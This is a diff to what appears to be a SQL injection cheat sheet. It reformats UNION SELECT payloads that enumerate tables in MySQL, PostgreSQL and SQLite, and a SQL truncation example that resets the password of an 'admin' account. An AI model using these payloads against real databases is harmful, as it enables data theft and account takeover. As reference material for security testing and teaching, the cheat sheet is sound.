@@ -107,19 +107,21 @@
 
 1.  Mysql
 
-	    union select group_concat(table_name) from information_schema.tables 
-2. PostgreSQL
-`UNION SELECT * FROM string_agg(tablename, ',') WHERE schemaname != 'pg_catalog'  AND schemaname != 'information_schema';`
+		union select group_concat(table_name) from information_schema.tables 
+		
+3. PostgreSQL
+
+		`UNION SELECT * FROM string_agg(tablename, ',') WHERE schemaname != 'pg_catalog'  AND schemaname != 'information_schema';`
 
 3. SQLite
 
-    `union select group_concat(name) from sqlite_master WHERE type='table'`
+    		`union select group_concat(name) from sqlite_master WHERE type='table'`
 
 - SQL Truncation
 
 e.g. :
 
-	Update Users set password = $password where username= $login
+    Update Users set password = $password where username= $login
 	login = varchar(25)
 	with $login = 'admin(blankspace x 19)x'
 
